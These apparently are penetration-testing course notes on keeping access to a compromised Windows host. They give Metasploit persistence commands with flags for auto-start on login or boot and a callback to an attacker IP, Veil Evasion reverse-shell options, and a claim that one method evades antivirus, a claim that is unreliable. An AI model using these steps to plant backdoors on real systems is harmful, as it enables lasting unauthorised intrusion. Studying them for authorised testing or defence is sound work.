---
title: Maintaining Access
---

### Veil Evasion

Use rev_http_service, rev_tcp_service  
Can be used in place of normal backdoor  
Does not always work

---

### Meterpreter - Persistence Module

````bash
persistence -h # Help Menu
run persistence -U -i <n> -p <port> -r <ip-address>
````

**Flags**:  
-U : Start on user login  
`-i <n>` : Try to connect every n secs  
-p : Port  
-r : Attacker IP Address  
-X : Automatically start on system boot

For detecting the connection a new "Multi Handler" will have to be setup  
Issue with Approach : Easily detected by Antivirus

---

### Metasploit and Veil Evasion

````bash
use exploit/windows/local/persistence
show options
````

EXE_NAME : Name to Backdoor to show in Explorer.exe  
SESSION : Current listening session

````bash
show advanced
````

EXE::Custom : Path to our custom backdoor

````bash
exploit
````

This approach is the most robust and is not detected by antivirus software

---

Another good Persistence module that can be used without Veil Framework

````bash
use exploit/windows/local/persistence_service
````